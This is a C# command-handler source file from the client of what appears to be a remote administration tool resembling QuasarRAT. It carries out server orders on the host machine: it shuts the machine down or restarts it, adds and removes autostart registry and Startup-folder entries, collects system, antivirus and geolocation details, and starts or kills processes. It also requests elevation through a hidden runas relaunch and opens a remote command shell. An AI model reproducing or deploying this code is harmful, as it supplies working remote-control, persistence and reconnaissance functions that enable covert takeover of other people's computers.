using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Windows.Forms;
using Microsoft.Win32;
using xClient.Config;
using xClient.Core.Data;
using xClient.Core.Extensions;
using xClient.Core.Helper;
using xClient.Core.Networking;
using xClient.Core.Utilities;
using xClient.Enums;

namespace xClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE THE SYSTEM (drives, directories, files, etc.). */
    public static partial class CommandHandler
    {
        public static void HandleGetDrives(Packets.ServerPackets.GetDrives command, Client client)
        {
            DriveInfo[] drives;
            try
            {
                drives = DriveInfo.GetDrives().Where(d => d.IsReady).ToArray();
            }
            catch (IOException)
            {
                new Packets.ClientPackets.SetStatusFileManager("GetDrives I/O error", false).Execute(client);
                return;
            }
            catch (UnauthorizedAccessException)
            {
                new Packets.ClientPackets.SetStatusFileManager("GetDrives No permission", false).Execute(client);
                return;
            }

            if (drives.Length == 0)
            {
                new Packets.ClientPackets.SetStatusFileManager("GetDrives No drives", false).Execute(client);
                return;
            }

            string[] displayName = new string[drives.Length];
            string[] rootDirectory = new string[drives.Length];
            for (int i = 0; i < drives.Length; i++)
            {
                string volumeLabel = null;
                try
                {
                    volumeLabel = drives[i].VolumeLabel;
                }
                catch
                {
                }

                if (string.IsNullOrEmpty(volumeLabel))
                {
                    displayName[i] = string.Format("{0} [{1}, {2}]", drives[i].RootDirectory.FullName,
                        FormatHelper.DriveTypeName(drives[i].DriveType), drives[i].DriveFormat);
                }
                else
                {
                    displayName[i] = string.Format("{0} ({1}) [{2}, {3}]", drives[i].RootDirectory.FullName, volumeLabel,
                        FormatHelper.DriveTypeName(drives[i].DriveType), drives[i].DriveFormat);
                }
                rootDirectory[i] = drives[i].RootDirectory.FullName;
            }

            new Packets.ClientPackets.GetDrivesResponse(displayName, rootDirectory).Execute(client);
        }

        public static void HandleDoShutdownAction(Packets.ServerPackets.DoShutdownAction command, Client client)
        {
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                switch (command.Action)
                {
                    case ShutdownAction.Shutdown:
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.UseShellExecute = true;
                        startInfo.Arguments = "/s /t 0"; // shutdown
                        startInfo.FileName = "shutdown";
                        Process.Start(startInfo);
                        break;
                    case ShutdownAction.Restart:
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.UseShellExecute = true;
                        startInfo.Arguments = "/r /t 0"; // restart
                        startInfo.FileName = "shutdown";
                        Process.Start(startInfo);
                        break;
                    case ShutdownAction.Standby:
                        Application.SetSuspendState(PowerState.Suspend, true, true); // standby
                        break;
                }
            }
            catch (Exception ex)
            {
                new Packets.ClientPackets.SetStatus(string.Format("Action failed: {0}", ex.Message)).Execute(client);
            }
        }

        public static void HandleGetStartupItems(Packets.ServerPackets.GetStartupItems command, Client client)
        {
            try
            {
                List<string> startupItems = new List<string>();

                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
                {
                    if (key != null)
                    {
                        startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "0" + formattedKeyValue));
                    }
                }
                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                {
                    if (key != null)
                    {
                        startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "1" + formattedKeyValue));
                    }
                }
                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
                {
                    if (key != null)
                    {
                        startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "2" + formattedKeyValue));
                    }
                }
                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                {
                    if (key != null)
                    {
                        startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "3" + formattedKeyValue));
                    }
                }
                if (PlatformHelper.Is64Bit)
                {
                    using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"))
                    {
                        if (key != null)
                        {
                            startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "4" + formattedKeyValue));
                        }
                    }
                    using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                    {
                        if (key != null)
                        {
                            startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "5" + formattedKeyValue));
                        }
                    }
                }
                if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
                {
                    var files = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup)).GetFiles();

                    startupItems.AddRange(from file in files where file.Name != "desktop.ini"
                                          select string.Format("{0}||{1}", file.Name, file.FullName) into formattedKeyValue
                                          select "6" + formattedKeyValue);
                }

                new Packets.ClientPackets.GetStartupItemsResponse(startupItems).Execute(client);
            }
            catch (Exception ex)
            {
                new Packets.ClientPackets.SetStatus(string.Format("Getting Autostart Items failed: {0}", ex.Message)).Execute(client);
            }
        }

        public static void HandleDoStartupItemAdd(Packets.ServerPackets.DoStartupItemAdd command, Client client)
        {
            try
            {
                switch (command.Type)
                {
                    case 0:
                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, true))
                        {
                            throw new Exception("Could not add value");
                        }
                        break;
                    case 1:
                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, true))
                        {
                            throw new Exception("Could not add value");
                        }
                        break;
                    case 2:
                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, true))
                        {
                            throw new Exception("Could not add value");
                        }
                        break;
                    case 3:
                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, true))
                        {
                            throw new Exception("Could not add value");
                        }
                        break;
                    case 4:
                        if (!PlatformHelper.Is64Bit)
                            throw new NotSupportedException("Only on 64-bit systems supported");

                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, true))
                        {
                            throw new Exception("Could not add value");
                        }
                        break;
                    case 5:
                        if (!PlatformHelper.Is64Bit)
                            throw new NotSupportedException("Only on 64-bit systems supported");

                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, true))
                        {
                            throw new Exception("Could not add value");
                        }
                        break;
                    case 6:
                        if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
                        {
                            Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
                        }

                        string lnkPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                            command.Name + ".url");

                        using (var writer = new StreamWriter(lnkPath, false))
                        {
                            writer.WriteLine("[InternetShortcut]");
                            writer.WriteLine("URL=file:///" + command.Path);
                            writer.WriteLine("IconIndex=0");
                            writer.WriteLine("IconFile=" + command.Path.Replace('\\', '/'));
                            writer.Flush();
                        }
                        break;
                }
            }
            catch (Exception ex)
            {
                new Packets.ClientPackets.SetStatus(string.Format("Adding Autostart Item failed: {0}", ex.Message)).Execute(client);
            }
        }

        public static void HandleDoStartupItemRemove(Packets.ServerPackets.DoStartupItemRemove command, Client client)
        {
            try
            {
                switch (command.Type)
                {
                    case 0:
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case 1:
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case 2:
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case 3:
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case 4:
                        if (!PlatformHelper.Is64Bit)
                            throw new NotSupportedException("Only on 64-bit systems supported");

                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case 5:
                        if (!PlatformHelper.Is64Bit)
                            throw new NotSupportedException("Only on 64-bit systems supported");

                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case 6:
                        string startupItemPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), command.Name);

                        if (!File.Exists(startupItemPath))
                            throw new IOException("File does not exist");

                        File.Delete(startupItemPath);
                        break;
                }
            }
            catch (Exception ex)
            {
                new Packets.ClientPackets.SetStatus(string.Format("Removing Autostart Item failed: {0}", ex.Message)).Execute(client);
            }
        }

        public static void HandleGetSystemInfo(Packets.ServerPackets.GetSystemInfo command, Client client)
        {
            try
            {
                IPGlobalProperties properties = IPGlobalProperties.GetIPGlobalProperties();

                var domainName = (!string.IsNullOrEmpty(properties.DomainName)) ? properties.DomainName : "-";
                var hostName = (!string.IsNullOrEmpty(properties.HostName)) ? properties.HostName : "-";


                string[] infoCollection = new string[]
                {
                    "Processor (CPU)",
                    DevicesHelper.GetCpuName(),
                    "Memory (RAM)",
                    string.Format("{0} MB", DevicesHelper.GetTotalRamAmount()),
                    "Video Card (GPU)",
                    DevicesHelper.GetGpuName(),
                    "Username",
                    WindowsAccountHelper.GetName(),
                    "PC Name",
                    SystemHelper.GetPcName(),
                    "Domain Name",
                    domainName,
                    "Host Name",
                    hostName,
                    "System Drive",
                    Path.GetPathRoot(Environment.SystemDirectory),
                    "System Directory",
                    Environment.SystemDirectory,
                    "Uptime",
                    SystemHelper.GetUptime(),
                    "MAC Address",
                    DevicesHelper.GetMacAddress(),
                    "LAN IP Address",
                    DevicesHelper.GetLanIp(),
                    "WAN IP Address",
                    GeoLocationHelper.GeoInfo.Ip,
                    "Antivirus",
                    SystemHelper.GetAntivirus(),
                    "Firewall",
                    SystemHelper.GetFirewall(),
                    "Time Zone",
                    GeoLocationHelper.GeoInfo.Timezone,
                    "Country",
                    GeoLocationHelper.GeoInfo.Country,
                    "ISP",
                    GeoLocationHelper.GeoInfo.Isp
                };

                new Packets.ClientPackets.GetSystemInfoResponse(infoCollection).Execute(client);
            }
            catch
            {
            }
        }

        public static void HandleGetProcesses(Packets.ServerPackets.GetProcesses command, Client client)
        {
            Process[] pList = Process.GetProcesses();
            string[] processes = new string[pList.Length];
            int[] ids = new int[pList.Length];
            string[] titles = new string[pList.Length];

            int i = 0;
            foreach (Process p in pList)
            {
                processes[i] = p.ProcessName + ".exe";
                ids[i] = p.Id;
                titles[i] = p.MainWindowTitle;
                i++;
            }

            new Packets.ClientPackets.GetProcessesResponse(processes, ids, titles).Execute(client);
        }

        public static void HandleDoProcessStart(Packets.ServerPackets.DoProcessStart command, Client client)
        {
            if (string.IsNullOrEmpty(command.Processname))
            {
                new Packets.ClientPackets.SetStatus("Process could not be started!").Execute(client);
                return;
            }

            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    UseShellExecute = true,
                    FileName = command.Processname
                };
                Process.Start(startInfo);
            }
            catch
            {
                new Packets.ClientPackets.SetStatus("Process could not be started!").Execute(client);
            }
            finally
            {
                HandleGetProcesses(new Packets.ServerPackets.GetProcesses(), client);
            }
        }

        public static void HandleDoProcessKill(Packets.ServerPackets.DoProcessKill command, Client client)
        {
            try
            {
                Process.GetProcessById(command.PID).Kill();
            }
            catch
            {
            }
            finally
            {
                HandleGetProcesses(new Packets.ServerPackets.GetProcesses(), client);
            }
        }

        public static void HandleDoAskElevate(Packets.ServerPackets.DoAskElevate command, Client client)
        {
            if (WindowsAccountHelper.GetAccountType() != "Admin")
            {
                ProcessStartInfo processStartInfo = new ProcessStartInfo
                {
                    FileName = "cmd",
                    Verb = "runas",
                    Arguments = "/k START \"\" \"" + ClientData.CurrentPath + "\" & EXIT",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true
                };

                MutexHelper.CloseMutex();  // close the mutex so our new process will run
                try
                {
                    Process.Start(processStartInfo);
                }
                catch
                {
                    new Packets.ClientPackets.SetStatus("User refused the elevation request.").Execute(client);
                    MutexHelper.CreateMutex(Settings.MUTEX);  // re-grab the mutex
                    return;
                }
                Program.ConnectClient.Exit();
            }
            else
            {
                new Packets.ClientPackets.SetStatus("Process already elevated.").Execute(client);
            }
        }
        
        public static void HandleDoShellExecute(Packets.ServerPackets.DoShellExecute command, Client client)
        {
            string input = command.Command;

            if (_shell == null && input == "exit") return;
            if (_shell == null) _shell = new Shell();

            if (input == "exit")
                CloseShell();
            else
                _shell.ExecuteCommand(input);
        }

        public static void CloseShell()
        {
            if (_shell != null)
                _shell.Dispose();
        }
    }
}
